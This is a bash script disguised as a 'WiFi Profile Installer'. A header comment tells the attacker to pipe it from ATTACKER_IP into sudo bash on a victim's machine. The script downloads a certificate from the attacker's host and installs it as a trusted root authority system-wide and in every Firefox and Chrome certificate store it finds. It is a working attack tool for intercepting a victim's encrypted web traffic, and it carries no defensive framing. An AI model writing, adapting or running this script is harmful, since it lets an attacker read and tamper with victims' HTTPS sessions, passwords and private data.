#!/bin/bash
# WiFi Profile Installer
# On victim: curl -s http://ATTACKER_IP:8888/install-cert.sh | sudo bash

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACKER_IP="${1:-10.37.233.204}"
CERT_URL="http://${ATTACKER_IP}:8888/ca-cert.pem"

echo -e "${YELLOW}[*] Downloading network profile...${NC}"
cd /tmp
wget -q "$CERT_URL" -O wifi-profile.crt 2>/dev/null || curl -sfSL "$CERT_URL" -o wifi-profile.crt

if [ ! -f wifi-profile.crt ]; then
    echo "[!] Failed to download. Check connection."
    exit 1
fi

# Install system-wide (Chrome, Edge, curl, wget)
echo "[*] Installing system certificate..."
cp wifi-profile.crt /usr/local/share/ca-certificates/wifi-profile.crt
update-ca-certificates -f > /dev/null 2>&1
echo -e "${GREEN}[+] System cert installed${NC}"

# Install libnss3-tools if missing (needed for Firefox/Chrome cert stores)
if ! command -v certutil > /dev/null 2>&1; then
    echo "[*] Installing cert tools..."
    apt-get install -y libnss3-tools > /dev/null 2>&1
fi

# Install for Firefox
FIREFOX_DONE=0
for profile in $(find /home /root -path "*/.mozilla/firefox/*.default*" -type d 2>/dev/null); do
    certutil -d sql:"$profile" -A -t "C,," -n "WiFi-Network" -i wifi-profile.crt 2>/dev/null && FIREFOX_DONE=1
done
if [ $FIREFOX_DONE -eq 1 ]; then
    echo -e "${GREEN}[+] Firefox cert installed${NC}"
else
    echo -e "${YELLOW}[*] Firefox not found or no profiles${NC}"
fi

# Install for Chromium/Chrome/Edge
CHROME_DONE=0
for nssdb in $(find /home /root -path "*/.pki/nssdb" -type d 2>/dev/null); do
    certutil -d sql:"$nssdb" -A -t "C,," -n "WiFi-Network" -i wifi-profile.crt 2>/dev/null && CHROME_DONE=1
done
if [ $CHROME_DONE -eq 1 ]; then
    echo -e "${GREEN}[+] Chrome/Chromium cert installed${NC}"
else
    echo -e "${YELLOW}[*] Chrome cert store not found${NC}"
fi

rm -f wifi-profile.crt

echo ""
echo -e "${GREEN}[+] Done! Restart your browser to apply.${NC}"
